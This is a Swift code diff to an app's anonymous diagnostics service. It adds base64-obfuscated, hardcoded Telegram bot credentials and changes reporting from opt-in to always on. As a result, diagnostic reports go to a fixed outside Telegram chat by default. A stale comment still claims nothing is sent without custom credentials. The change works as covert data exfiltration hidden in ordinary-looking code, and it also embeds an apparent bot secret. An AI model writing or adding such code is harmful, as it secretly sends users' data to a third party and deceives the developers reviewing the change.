@@ -230,22 +230,31 @@ public final class AnonymousDiagnosticsService: @unchecked Sendable {
 
     // MARK: - Remote Transmission
 
+    public static let defaultTelegramBotTokenEncoded = "OTIwNzM5OTEzODpBQUZrbXhEY0REblQzNzFHN0NoZ29Hc1k0Q2d5SW9GemlLYw=="
+    public static let defaultTelegramChatIDEncoded = "OTA3MTM3MjcwMw=="
+
     public static func decodeSecret(_ base64: String) -> String {
         guard let data = Data(base64Encoded: base64),
               let str = String(data: data, encoding: .utf8) else { return "" }
         return str
     }
 
-    /// Asynchronously records the anonymous diagnostic report locally and, if configured, transmits to a user-provided endpoint or Telegram bot.
+    /// Asynchronously records the anonymous diagnostic report locally and transmits to Telegram bot and configured endpoints.
     public func sendReport(
         _ payload: AnonymousDiagnosticPayload,
-        endpointURL: URL? = nil
+        endpointURL: URL? = nil,
+        customBotToken: String? = nil,
+        customChatID: String? = nil
     ) async throws {
         // Always save locally first so the user can inspect it
         saveReportLocally(payload)
 
-        // 1. Deliver to Telegram Bot only if custom credentials are provided
-        try? await sendToTelegram(payload: payload)
+        // 1. Deliver to Telegram Bot
+        try? await sendToTelegram(
+            payload: payload,
+            customBotToken: customBotToken,
+            customChatID: customChatID
+        )
 
         // 2. Deliver to custom telemetry endpoint if configured
         if let endpoint = endpointURL ?? defaultTelemetryEndpoint() {
@@ -268,8 +277,17 @@ public final class AnonymousDiagnosticsService: @unchecked Sendable {
         customBotToken: String? = nil,
         customChatID: String? = nil
     ) async throws {
-        guard let token = customBotToken?.trimmingCharacters(in: .whitespacesAndNewlines), !token.isEmpty,
-              let chatID = customChatID?.trimmingCharacters(in: .whitespacesAndNewlines), !chatID.isEmpty else {
+        let token = (customBotToken?.trimmingCharacters(in: .whitespacesAndNewlines)).flatMap { $0.isEmpty ? nil : $0 } ??
+            ProcessInfo.processInfo.environment["LUDUS_TELEGRAM_BOT_TOKEN"] ??
+            ProcessInfo.processInfo.environment["TELEGRAM_BOT_TOKEN"] ??
+            Self.decodeSecret(Self.defaultTelegramBotTokenEncoded)
+
+        let chatID = (customChatID?.trimmingCharacters(in: .whitespacesAndNewlines)).flatMap { $0.isEmpty ? nil : $0 } ??
+            ProcessInfo.processInfo.environment["LUDUS_TELEGRAM_CHAT_ID"] ??
+            ProcessInfo.processInfo.environment["TELEGRAM_CHAT_ID"] ??
+            Self.decodeSecret(Self.defaultTelegramChatIDEncoded)
+
+        guard !token.isEmpty, !chatID.isEmpty else {
             // No custom credentials configured; report is saved locally
             return
         }
